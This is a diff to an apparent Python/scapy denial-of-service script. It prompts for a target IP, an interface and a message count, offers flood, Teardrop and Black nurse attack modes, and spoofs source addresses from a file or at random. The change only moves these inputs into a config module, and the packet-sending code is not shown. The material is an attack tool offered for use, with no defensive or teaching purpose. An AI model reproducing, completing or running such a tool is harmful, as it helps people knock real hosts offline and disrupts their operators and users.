@@ -1,13 +1,14 @@
-import sys, random, scapy
+import sys, random
+import scapy
 from scapy.all import *
+import config
 
-dst_ip = raw_input("IP to attack: ")
-n_msg = raw_input("Number of messages: ")
-interface = raw_input("Inteface: ")
-print("Type: \n1) Flood \n2) Teardrop \n3) Black nurse")
-type = raw_input("")
-print("Origin IPs: \n1) From ips.txt \n2) Random")
-orig_type =raw_input("")
+dst_ip = raw_input("IP to attack: ") if config.dst_ip == "" else config.dst_ip
+n_msg = raw_input("Number of messages: ") if config.n_msg == "" else config.n_msg
+interface = raw_input("Inteface: ") if config.interface == "" else config.interface
+type = raw_input("Type: \n1) Flood \n2) Teardrop \n3) Black nurse") if config.type == "" else config.type
+orig_type = raw_input("Origin IPs: \n1) From ips.txt \n2) Random") if config.orig_type == "" else config.orig_type
+
 ips = []
 
 def get_random_ips(n):
@@ -17,8 +18,8 @@ def get_random_ips(n):
 
 
 if orig_type == "2":
-	num_ips = raw_input("Number of IPs:")
-	get_random_ips(num_ips)
+	#num_ips = raw_input("Number of IPs:")
+	get_random_ips(n_msg)
 else:
 	for line in open("ips.txt"):
 		ips.append(line.replace('\n',''))
